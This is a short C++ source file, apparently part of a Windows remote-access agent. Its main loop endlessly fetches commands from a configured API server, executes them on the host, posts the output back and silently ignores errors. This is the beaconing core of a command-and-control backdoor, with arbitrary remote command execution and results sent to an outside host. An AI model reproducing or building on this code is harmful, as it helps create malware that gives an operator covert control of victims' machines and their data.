#include <string>

#include "core/api_client.hpp"
#include "core/models.hpp"

#include "config.hpp"
#include "main_application.hpp"


main_application::main_application(): client(config::API_URL){

}

void main_application::fetch_and_execute_command(){
	command_request command = this->client.get_command();
	std::string result = this->executor.execute(command.command);
	this->client.submit_results(
		command_result(command.id, result)
	);
}

void main_application::loop(){

	while(true){
		try{
			this->fetch_and_execute_command();
		}
		catch(int err){
			
		}
		Sleep(config::SLEEP_TIME);

	}

}

void main_application::start(){
	this->loop();
}